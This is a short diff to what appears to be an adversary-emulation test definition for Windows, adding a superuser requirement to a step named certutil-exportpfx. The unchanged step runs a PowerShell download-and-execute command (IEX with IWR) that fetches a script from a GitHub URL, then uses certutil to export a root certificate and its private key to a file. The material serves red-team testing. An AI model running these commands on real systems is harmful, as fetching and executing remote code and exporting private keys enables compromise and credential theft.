@@ -23,6 +23,7 @@ mitre:
 requirements:
     platforms:
         - os: windows
+    superuser: true
 steps:
     - name: certutil-exportpfx
       inline: "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p {{.Args.password}} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 {{.Args.output}}\n"
